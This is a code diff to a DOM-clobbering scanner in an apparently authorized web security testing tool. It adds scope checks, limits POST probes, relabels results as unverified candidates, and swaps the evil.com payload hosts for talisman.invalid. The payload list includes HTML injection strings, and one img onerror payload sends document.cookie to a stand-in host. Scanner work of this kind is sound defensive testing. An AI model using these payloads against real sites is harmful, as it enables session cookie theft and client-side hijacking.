@@ -5,7 +5,7 @@ import random
 import re
 import string
 from typing import Any
-from talisman.utils.http_client import TalismanHTTPClient
+from talisman.engine.scope import ScopeViolationError\nfrom talisman.utils.http_client import TalismanHTTPClient
 from talisman.utils.logger import get_logger, console, print_finding
 
 log = get_logger(__name__)
@@ -25,15 +25,15 @@ HTML_INJECTION_ENDPOINTS = [
 # collide with common JavaScript variable names used by frameworks
 DOM_CLOBBERING_PAYLOADS = [
     # Anchor tag with href (classic: window.config = {href: 'evil.js'})
-    ('<a id="canaryID" href="https://evil.com/malicious.js">click</a>', "Anchor element clobbering"),
-    ('<a id="canaryID" name="canaryID" href="https://evil.com/malicious.js">click</a>', "Anchor name + id clobbering"),
+    ('<a id="canaryID" href="https://talisman.invalid/malicious.js">click</a>', "Anchor element clobbering"),
+    ('<a id="canaryID" name="canaryID" href="https://talisman.invalid/malicious.js">click</a>', "Anchor name + id clobbering"),
     # Form element with action
-    ('<form id="canaryID" action="https://evil.com/steal"></form>', "Form action clobbering"),
-    ('<form name="canaryID" action="https://evil.com/steal"></form>', "Form name clobbering"),
+    ('<form id="canaryID" action="https://talisman.invalid/steal"></form>', "Form action clobbering"),
+    ('<form name="canaryID" action="https://talisman.invalid/steal"></form>', "Form name clobbering"),
     # Base tag (can redirect all relative URLs)
-    ('<base id="canaryID" href="https://evil.com/">', "Base tag clobbering"),
+    ('<base id="canaryID" href="https://talisman.invalid/">', "Base tag clobbering"),
     # Script-like elements without being script
-    ('<img id="canaryID" src="x" onerror="fetch(\'https://evil.com/\'%2Bdocument.cookie)">', "Img onerror clobbering"),
+    ('<img id="canaryID" src="x" onerror="fetch(\'https://talisman.invalid/\'%2Bdocument.cookie)">', "Img onerror clobbering"),
     # Overwriting document API
     ('<a id="cookie" href="https://evil.com">cookie</a>', "document.cookie clobbering"),
     ('<a id="getElementById" href="https://evil.com">getElementById</a>', "document.getElementById clobbering"),
@@ -46,6 +46,7 @@ DOM_CLOBBERING_PAYLOADS = [
 
 async def _test_dom_clobbering(
     url: str, endpoint: str, client: TalismanHTTPClient,
+    allow_post_probes: bool = False,
 ) -> list[dict[str, Any]]:
     """Test for DOM Clobbering by injecting HTML elements and checking reflection.
 
@@ -77,6 +78,8 @@ async def _test_dom_clobbering(
 
         # Determine method based on endpoint
         method = "GET" if "/search" in endpoint or "/echo" in endpoint else "POST"
+        if method == "POST" and not allow_post_probes:
+            continue
 
         for params in test_variants:
             try:
@@ -128,6 +131,7 @@ async def _test_dom_clobbering(
 
 async def _test_dom_clobbering_sinks(
     url: str, endpoint: str, client: TalismanHTTPClient,
+    allow_post_probes: bool = False,
 ) -> list[dict[str, Any]]:
     """Test for DOM Clobbering that specifically targets common JS sinks.
 
@@ -156,6 +160,8 @@ async def _test_dom_clobbering_sinks(
         ]
 
         for params, method in test_variants:
+            if method == "POST" and not allow_post_probes:
+                continue
             try:
                 if method == "GET":
                     r = await client.get(test_url, params=params, timeout=8)
@@ -186,61 +192,65 @@ async def run(
     proxy: str | None = None,
     **kwargs: Any,
 ) -> dict[str, Any]:
+    """Find HTML reflection candidates without claiming browser-side clobbering."""
     url = target if "://" in target else f"https://{target}"
-    console.print(f"\n[module][+] DOM Clobbering Scanner[/module] -> [target]{url}[/target]")
-    findings: list[dict[str, Any]] = []
+    if scope is None:
+        return {
+            "target": url, "findings": [], "candidates": [], "count": 0,
+            "candidate_count": 0, "error": "scope_enforcer_required",
+        }
+    scope.assert_in_scope(url)
 
-    async with TalismanHTTPClient(proxy=proxy, timeout=12) as client:
-        console.print(f"  Testing {len(HTML_INJECTION_ENDPOINTS)} endpoints for DOM Clobbering...")
+    allow_post_probes = False
+    try:
+        scope.assert_destructive_allowed(url, "POST")
+        allow_post_probes = True
+    except ScopeViolationError:
+        pass
 
+    console.print(
+        f"\n[module][+] DOM Clobbering Candidate Scanner[/module] -> [target]{url}[/target]"
+    )
+    candidates: list[dict[str, Any]] = []
+    async with TalismanHTTPClient(proxy=proxy, timeout=12, scope=scope) as client:
         for endpoint in HTML_INJECTION_ENDPOINTS:
-            # -- 1. Standard DOM Clobbering payloads ----------------------------------
-            dc_findings = await _test_dom_clobbering(url, endpoint, client)
-            for f in dc_findings:
-                clobber_type = f.get("type", "generic_html_clobbering")
-                severity = "high" if "cookie" in clobber_type or "api" in clobber_type else "medium"
-                title = f"DOM Clobbering ({clobber_type}) at {endpoint}: {f.get('description', '')}"
-                print_finding(title, severity, url)
-                findings.append(f)
-                if session:
-                    cwe_map = {
-                        "cookie_clobbering": "CWE-79",
-                        "api_clobbering": "CWE-79",
-                        "anchor_href_clobbering": "CWE-79",
-                        "form_action_clobbering": "CWE-79",
-                        "base_tag_clobbering": "CWE-444",
-                        "event_handler_clobbering": "CWE-79",
-                        "generic_html_clobbering": "CWE-79",
-                    }
-                    await session.add_finding(
-                        target=url, module="dom_clobbering",
-                        vuln_type=clobber_type,
-                        severity=severity, confidence="confirmed",
-                        title=title,
-                        description=f"DOM Clobbering possible at {endpoint}. HTML element with id='{f.get('canary_id', '')}' was reflected in the response. An attacker can inject elements that collide with JavaScript variables to hijack client-side logic.",
-                        evidence=f.get("evidence", ""),
-                        remediation="1. HTML-encode all user input before reflection. 2. Use Trusted Types policy with require-trusted-types-for 'script'. 3. Use DOMPurify with SANITIZE_DOM: true and SANITIZE_NAMED_PROPS: true. 4. Avoid accessing global config via window.[name] pattern.",
-                        cvss_score=8.1 if severity == "high" else 6.8, cwe=cwe_map.get(clobber_type, "CWE-79"),
-                    )
+            for candidate in await _test_dom_clobbering(
+                url, endpoint, client, allow_post_probes=allow_post_probes
+            ):
+                candidates.append({
+                    **candidate,
+                    "confidence": "candidate",
+                    "requires_browser_verification": True,
+                    "verification_required": (
+                        "Confirm the response is parsed as active HTML in a browser, "
+                        "identify a real DOM-clobbering gadget in application code, "
+                        "and demonstrate a security-relevant effect. Reflection of "
+                        "an id/name attribute alone is not DOM clobbering impact."
+                    ),
+                })
 
-            # -- 2. Sink-specific clobbering -----------------------------------------
-            sk_findings = await _test_dom_clobbering_sinks(url, endpoint, client)
-            for f in sk_findings:
-                sink = f.get("sink", "unknown")
-                title = f"DOM Clobbering sink at {endpoint}: window.{sink} overwriteable"
-                print_finding(title, "high", url)
-                findings.append(f)
-                if session:
-                    await session.add_finding(
-                        target=url, module="dom_clobbering",
-                        vuln_type="sink_clobbering",
-                        severity="high", confidence="confirmed",
-                        title=title,
-                        description=f"window.{sink} is clobberable via HTML injection at {endpoint}. An attacker can inject an element with id='{sink}' to control the '{sink}' JavaScript variable, hijacking any code that reads from it.",
-                        evidence=f.get("evidence", ""),
-                        remediation="1. Use const/let declarations for sensitive config. 2. Validate object types before using config values. 3. Use Object.freeze() on config objects. 4. HTML-encode all reflected input.",
-                        cvss_score=8.1, cwe="CWE-79",
-                    )
+            for candidate in await _test_dom_clobbering_sinks(
+                url, endpoint, client, allow_post_probes=allow_post_probes
+            ):
+                candidates.append({
+                    **candidate,
+                    "confidence": "candidate",
+                    "requires_browser_verification": True,
+                    "verification_required": (
+                        "Demonstrate that application JavaScript reads the clobbered "
+                        "named property and that this changes a security-relevant "
+                        "decision or resource load."
+                    ),
+                })
 
-    console.print(f"  DOM Clobbering scan complete -- {len(findings)} issues")
-    return {"target": url, "findings": findings, "count": len(findings)}
+    console.print(
+        f"  DOM-clobbering scan complete -- {len(candidates)} reflection candidates"
+    )
+    return {
+        "target": url,
+        "findings": [],
+        "candidates": candidates,
+        "count": 0,
+        "candidate_count": len(candidates),
+        "post_probes_enabled": allow_post_probes,
+    }
